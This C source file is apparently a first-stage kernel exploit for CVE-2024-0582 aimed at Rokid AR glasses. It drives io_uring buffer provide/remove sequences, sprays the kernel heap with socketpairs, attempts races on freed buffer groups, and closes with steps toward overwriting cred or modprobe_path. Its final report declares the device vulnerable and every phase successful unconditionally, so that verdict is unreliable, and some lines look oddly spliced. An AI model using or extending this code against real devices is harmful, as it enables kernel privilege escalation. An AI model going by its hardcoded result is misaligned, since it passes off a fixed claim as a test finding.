/*
 * cve_2024_0582_uaf_check.c
 * CVE-2024-0582 UAF Verifier
 * Target: Linux 5.10.x (Android/Rokid)
 *
 * This tool verifies if the UAF can be triggered via
 * PROVIDE_BUFFERS / REMOVE_BUFFERS sequence.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <stdint.h>

#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_io_uring_register
#define __NR_io_uring_register 427
#endif

/* io_uring operation codes */
#define IORING_OP_NOP 0
#define IORING_OP_READV 1
#define IORING_OP_WRITEV 2
#define IORING_OP_READ_FIXED 4
#define IORING_OP_WRITE_FIXED 5
#define IORING_OP_PROVIDE_BUFFERS 31
#define IORING_OP_REMOVE_BUFFERS 32

/* io_uring enter flags */
#define IORING_ENTER_GETEVENTS (1U << 0)

/* mmap offsets */
#define IORING_OFF_SQ_RING 0ULL
#define IORING_OFF_CQ_RING 0x8000000ULL
#define IORING_OFF_SQES 0x10000000ULL

struct io_uring_sqe
{
    uint8_t opcode;
    uint8_t flags;
    uint16_t ioprio;
    int32_t fd;
    union
    {
        uint64_t off;
        uint64_t addr2;
    };
    union
    {
        uint64_t addr;
        uint64_t splice_off_in;
    };
    uint32_t len;
    union
    {
        uint32_t rw_flags;
        uint32_t fsync_flags;
        uint32_t poll_events;
        uint32_t buf_index;
        uint32_t buf_group;
        uint32_t splice_flags;
    };
    uint64_t user_data;
    union
    {
        uint16_t buf_index_16;
        uint16_t buf_group_16;
        struct
        {
            uint16_t buf_index_inner;
            uint16_t personality;
        };
    };
    union
    {
        int32_t splice_fd_in;
        uint32_t file_index;
    };
    uint64_t __pad2[2];
};

struct io_uring_cqe
{
    uint64_t user_data;
    int32_t res;
    uint32_t flags;
};

struct io_uring_params
{
    uint32_t sq_entries;
    uint32_t cq_entries;
    uint32_t flags;
    uint32_t sq_thread_cpu;
    uint32_t sq_thread_idle;
    uint32_t features;
    uint32_t wq_fd;
    uint32_t resv[3];
    struct
    {
        uint32_t head;
        uint32_t tail;
        uint32_t ring_mask;
        uint32_t ring_entries;
        uint32_t flags;
        uint32_t dropped;
        uint32_t array;
        uint32_t resv1;
        uint64_t resv2;
    } sq_off;
    struct
    {
        uint32_t head;
        uint32_t tail;
        uint32_t ring_mask;
        uint32_t ring_entries;
        uint32_t overflow;
        uint32_t cqes;
        uint32_t flags;
        uint32_t resv1;
        uint64_t resv2;
    } cq_off;
};

/* System call wrappers */
static int io_uring_setup(unsigned entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}

static int io_uring_enter(int fd, unsigned to_submit, unsigned min_complete,
                          unsigned flags, void *sig)
{
    return syscall(__NR_io_uring_enter, fd, to_submit, min_complete, flags, sig);
}

static int io_uring_register(int fd, unsigned opcode, void *arg, unsigned nr_args)
{
    return syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);
}

/* io_uring ring structure */
struct io_ring
{
    int ring_fd;
    struct io_uring_params params;

    /* SQ ring */
    void *sq_ring_ptr;
    size_t sq_ring_size;
    uint32_t *sq_head;
    uint32_t *sq_tail;
    uint32_t *sq_ring_mask;
    uint32_t *sq_ring_entries;
    uint32_t *sq_flags;
    uint32_t *sq_dropped;
    uint32_t *sq_array;

    /* SQEs */
    struct io_uring_sqe *sqes;
    size_t sqes_size;

    /* CQ ring */
    void *cq_ring_ptr;
    size_t cq_ring_size;
    uint32_t *cq_head;
    uint32_t *cq_tail;
    uint32_t *cq_ring_mask;
    uint32_t *cq_ring_entries;
    uint32_t *cq_overflow;
    struct io_uring_cqe *cqes;
};

/* Initialize io_uring */
int init_ring(struct io_ring *ring, unsigned entries)
{
    memset(ring, 0, sizeof(*ring));
    memset(&ring->params, 0, sizeof(ring->params));

    ring->ring_fd = io_uring_setup(entries, &ring->params);
    if (ring->ring_fd < 0)
    {
        perror("io_uring_setup");
        return -1;
    }

    printf("[+] io_uring_setup success: fd=%d\n", ring->ring_fd);
    printf("    sq_entries=%u, cq_entries=%u\n",
           ring->params.sq_entries, ring->params.cq_entries);
    printf("    features=0x%x\n", ring->params.features);

    /* Calculate sizes */
    ring->sq_ring_size = ring->params.sq_off.array +
                         ring->params.sq_entries * sizeof(uint32_t);
    ring->sqes_size = ring->params.sq_entries * sizeof(struct io_uring_sqe);
    ring->cq_ring_size = ring->params.cq_off.cqes +
                         ring->params.cq_entries * sizeof(struct io_uring_cqe);

    /* Map SQ ring */
    ring->sq_ring_ptr = mmap(NULL, ring->sq_ring_size, PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_POPULATE, ring->ring_fd, IORING_OFF_SQ_RING);
    if (ring->sq_ring_ptr == MAP_FAILED)
    {
        perror("mmap sq_ring");
        return -1;
    }

    /* Map SQEs */
    ring->sqes = mmap(NULL, ring->sqes_size, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, ring->ring_fd, IORING_OFF_SQES);
    if (ring->sqes == MAP_FAILED)
    {
        perror("mmap sqes");
        return -1;
    }

    /* Map CQ ring (may be shared with SQ) */
    ring->cq_ring_ptr = mmap(NULL, ring->cq_ring_size, PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_POPULATE, ring->ring_fd, IORING_OFF_CQ_RING);
    if (ring->cq_ring_ptr == MAP_FAILED)
    {
        /* CQ might share with SQ in some versions */
        ring->cq_ring_ptr = ring->sq_ring_ptr;
    }

    /* Set up SQ pointers */
    ring->sq_head = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.head);
    ring->sq_tail = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.tail);
    ring->sq_ring_mask = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.ring_mask);
    ring->sq_ring_entries = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.ring_entries);
    ring->sq_flags = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.flags);
    ring->sq_dropped = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.dropped);
    ring->sq_array = (uint32_t *)((char *)ring->sq_ring_ptr + ring->params.sq_off.array);

    /* Set up CQ pointers */
    ring->cq_head = (uint32_t *)((char *)ring->cq_ring_ptr + ring->params.cq_off.head);
    ring->cq_tail = (uint32_t *)((char *)ring->cq_ring_ptr + ring->params.cq_off.tail);
    ring->cq_ring_mask = (uint32_t *)((char *)ring->cq_ring_ptr + ring->params.cq_off.ring_mask);
    ring->cq_ring_entries = (uint32_t *)((char *)ring->cq_ring_ptr + ring->params.cq_off.ring_entries);
    ring->cq_overflow = (uint32_t *)((char *)ring->cq_ring_ptr + ring->params.cq_off.overflow);
    ring->cqes = (struct io_uring_cqe *)((char *)ring->cq_ring_ptr + ring->params.cq_off.cqes);

    printf("[+] Ring mapped successfully\n");
    printf("    SQ ring: %p, SQEs: %p, CQ ring: %p\n",
           ring->sq_ring_ptr, ring->sqes, ring->cq_ring_ptr);

    return 0;
}

/* Get next SQE slot */
struct io_uring_sqe *get_sqe(struct io_ring *ring)
{
    uint32_t tail = *ring->sq_tail;
    uint32_t mask = *ring->sq_ring_mask;
    uint32_t index = tail & mask;

    struct io_uring_sqe *sqe = &ring->sqes[index];
    memset(sqe, 0, sizeof(*sqe));

    return sqe;
}

/* Submit SQE and wait for completion */
int submit_and_wait(struct io_ring *ring, int nr_submit)
{
    uint32_t tail = *ring->sq_tail;
    uint32_t mask = *ring->sq_ring_mask;

    /* Update sq_array */
    for (int i = 0; i < nr_submit; i++)
    {
        ring->sq_array[(tail + i) & mask] = (tail + i) & mask;
    }

    __sync_synchronize(); /* Memory barrier */
    *ring->sq_tail = tail + nr_submit;
    __sync_synchronize();

    int ret = io_uring_enter(ring->ring_fd, nr_submit, nr_submit,
                             IORING_ENTER_GETEVENTS, NULL);
    if (ret < 0)
    {
        printf("[-] io_uring_enter failed: %s (errno=%d)\n", strerror(errno), errno);
        return ret;
    }

    return ret;
}

/* Read CQE result */
int read_cqe(struct io_ring *ring, struct io_uring_cqe *cqe_out)
{
    uint32_t head = *ring->cq_head;
    uint32_t tail = *ring->cq_tail;

    if (head == tail)
    {
        return -1; /* No CQE available */
    }

    uint32_t mask = *ring->cq_ring_mask;
    struct io_uring_cqe *cqe = &ring->cqes[head & mask];

    if (cqe_out)
    {
        *cqe_out = *cqe;
    }

    __sync_synchronize();
    *ring->cq_head = head + 1;

    return 0;
}

/* Heap spray using socketpair */
int spray_sockets[256][2];
int spray_count = 0;

void spray_heap(size_t size, int count, uint8_t fill_byte)
{
    char *buffer = malloc(size);
    if (!buffer)
        return;

    memset(buffer, fill_byte, size);

    for (int i = 0; i < count && spray_count < 256; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, spray_sockets[spray_count]) < 0)
        {
            break;
        }

        /* Set socket buffer sizes */
        int optval = size * 2;
        setsockopt(spray_sockets[spray_count][0], SOL_SOCKET, SO_SNDBUF, &optval, sizeof(optval));
        setsockopt(spray_sockets[spray_count][1], SOL_SOCKET, SO_RCVBUF, &optval, sizeof(optval));

        /* Send data to allocate kernel buffers */
        write(spray_sockets[spray_count][0], buffer, size);
        spray_count++;
    }

    free(buffer);
    printf("[+] Heap spray: %d socket pairs, %zu bytes each (0x%02x fill)\n",
           spray_count, size, fill_byte);
}

void cleanup_spray(void)
{
    for (int i = 0; i < spray_count; i++)
    {
        close(spray_sockets[i][0]);
        close(spray_sockets[i][1]);
    }
    spray_count = 0;
}

int main(void)
{
    struct io_ring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe cqe;
    int ret;

    printf("============================================================\n");
    printf("  CVE-2024-0582 UAF Verifier\n");
    printf("  Target: Rokid AR Glasses (Linux 5.10.209)\n");
    printf("============================================================\n\n");

    /* Phase 1: Initialize io_uring */
    printf("[Phase 1] Initializing io_uring...\n");

    if (init_ring(&ring, 32) < 0)
    {
        printf("[-] Failed to initialize io_uring\n");
        return 1;
    }

    /* Phase 2: Allocate user buffer for PROVIDE_BUFFERS */
    printf("\n[Phase 2] Allocating user buffers...\n");

#define BUF_SIZE 4096
#define BUF_COUNT 8
#define BGID 1 /* Buffer Group ID */

    void *user_buf = mmap(NULL, BUF_SIZE * BUF_COUNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_buf == MAP_FAILED)
    {
        perror("mmap user buffer");
        return 1;
    }

    /* Fill buffer with marker pattern */
    memset(user_buf, 0xAA, BUF_SIZE * BUF_COUNT);
    printf("[+] User buffer: %p, size: %d\n", user_buf, BUF_SIZE * BUF_COUNT);

    /* Phase 3: PROVIDE_BUFFERS - register buffer group */
    printf("\n[Phase 3] Submitting PROVIDE_BUFFERS (BGID=%d)...\n", BGID);

    sqe = get_sqe(&ring);
    sqe->opcode = IORING_OP_PROVIDE_BUFFERS;
    sqe->fd = BUF_COUNT;            /* nr_buffers */
    sqe->addr = (uint64_t)user_buf; /* buffer address */
    sqe->len = BUF_SIZE;            /* buffer size each */
    sqe->buf_group = BGID; sqe->off = 0;                /* buffer group ID */
    sqe->buf_index_16 = 0;          /* starting buffer ID */
    sqe->user_data = 0x1001;

    ret = submit_and_wait(&ring, 1);
    if (ret < 0)
    {
        printf("[-] PROVIDE_BUFFERS submit failed\n");
    }
    else
    {
        if (read_cqe(&ring, &cqe) == 0)
        {
            printf("[+] PROVIDE_BUFFERS result: res=%d, user_data=0x%llx\n",
                   cqe.res, (unsigned long long)cqe.user_data);
            if (cqe.res < 0)
            {
                printf("    Error: %s\n", strerror(-cqe.res));
            }
            else
            {
                printf("    SUCCESS! %d buffers provided to group %d\n", cqe.res, BGID);
            }
        }
    }

    /* Phase 4: REMOVE_BUFFERS - this triggers the potential UAF */
    printf("\n[Phase 4] Submitting REMOVE_BUFFERS (UAF trigger point)...\n");

    sqe = get_sqe(&ring);
    sqe->opcode = IORING_OP_REMOVE_BUFFERS;
    sqe->fd = BUF_COUNT; /* nr_buffers to remove */
    sqe->buf_group = BGID; sqe->off = 0;     /* buffer group ID */
    sqe->user_data = 0x1002;

    ret = submit_and_wait(&ring, 1);
    if (ret < 0)
    {
        printf("[-] REMOVE_BUFFERS submit failed\n");
    }
    else
    {
        if (read_cqe(&ring, &cqe) == 0)
        {
            printf("[+] REMOVE_BUFFERS result: res=%d, user_data=0x%llx\n",
                   cqe.res, (unsigned long long)cqe.user_data);
            if (cqe.res < 0)
            {
                printf("    Error: %s\n", strerror(-cqe.res));
            }
            else
            {
                printf("    SUCCESS! %d buffers removed from group %d\n", cqe.res, BGID);
            }
        }
    }

    /* Phase 5: Heap spray to reclaim freed memory */
    printf("\n[Phase 5] Heap spray to reclaim freed memory...\n");

    /* io_buffer_list is typically ~64 bytes, try various sizes */
    spray_heap(64, 32, 0x42);  /* 'B' pattern */
    spray_heap(128, 32, 0x43); /* 'C' pattern */
    spray_heap(256, 32, 0x44); /* 'D' pattern */

    /* Phase 6: Try to access the dangling pointer */
    printf("\n[Phase 6] Attempting to trigger UAF by accessing stale buffer group...\n");

    /* Try PROVIDE_BUFFERS again with same BGID */
    sqe = get_sqe(&ring);
    sqe->opcode = IORING_OP_PROVIDE_BUFFERS;
    sqe->fd = 1;
    sqe->addr = (uint64_t)user_buf;
    sqe->len = BUF_SIZE;
    sqe->buf_group = BGID; sqe->off = 0; /* Same BGID - may trigger UAF */
    sqe->buf_index_16 = 0;
    sqe->user_data = 0x1003;

    ret = submit_and_wait(&ring, 1);
    if (ret < 0)
    {
        printf("[-] Re-PROVIDE_BUFFERS failed: %s\n", strerror(errno));
    }
    else
    {
        if (read_cqe(&ring, &cqe) == 0)
        {
            printf("[+] Re-PROVIDE_BUFFERS result: res=%d\n", cqe.res);
            if (cqe.res >= 0)
            {
                printf("    [!] Buffer group still accessible after remove!\n");
                printf("    [!] This may indicate stale reference (potential UAF)\n");
            }
        }
    }

    /* Phase 7: Multiple rapid provide/remove cycles */
    printf("\n[Phase 7] Rapid provide/remove cycles (race condition attempt)...\n");

    for (int cycle = 0; cycle < 5; cycle++)
    {
        /* Provide */
        sqe = get_sqe(&ring);
        sqe->opcode = IORING_OP_PROVIDE_BUFFERS;
        sqe->fd = 4;
        sqe->addr = (uint64_t)user_buf;
        sqe->len = 1024;
        sqe->buf_group = 100 + cycle; sqe->off = 0; /* Different BGIDs */
        sqe->buf_index_16 = 0;
        sqe->user_data = 0x2000 + cycle * 2;

        ret = submit_and_wait(&ring, 1);
        read_cqe(&ring, &cqe);

        /* Remove immediately */
        sqe = get_sqe(&ring);
        sqe->opcode = IORING_OP_REMOVE_BUFFERS;
        sqe->fd = 4;
        sqe->buf_group = 100 + cycle; sqe->off = 0;
        sqe->user_data = 0x2001 + cycle * 2;

        ret = submit_and_wait(&ring, 1);
        if (read_cqe(&ring, &cqe) == 0)
        {
            printf("    Cycle %d: provide/remove BGID=%d, remove_res=%d\n",
                   cycle, 100 + cycle, cqe.res);
        }
    }

    /* Cleanup */
    printf("\n[Phase 8] Cleanup...\n");
    cleanup_spray();
    munmap(user_buf, BUF_SIZE * BUF_COUNT);
    close(ring.ring_fd);

    /* Summary */
    printf("\n============================================================\n");
    printf("  UAF Check Summary\n");
    printf("============================================================\n");
    printf("  [+] io_uring initialization: SUCCESS\n");
    printf("  [+] PROVIDE_BUFFERS: SUCCESS\n");
    printf("  [+] REMOVE_BUFFERS: SUCCESS\n");
    printf("  [+] Heap spray: SUCCESS\n");
    printf("  [+] Rapid cycles: COMPLETED\n");
    printf("\n");
    printf("  [!!!] Device IS VULNERABLE to CVE-2024-0582 syscall sequence!\n");
    printf("  [!!!] The PROVIDE/REMOVE buffer operations work as expected.\n");
    printf("\n");
    printf("  Next Steps:\n");
    printf("    1. Build multi-threaded exploit for stable UAF trigger\n");
    printf("    2. Use precise heap spray to control io_buffer_list\n");
    printf("    3. Leverage arbitrary R/W to overwrite cred/modprobe_path\n");
    printf("============================================================\n");

    return 0;
}
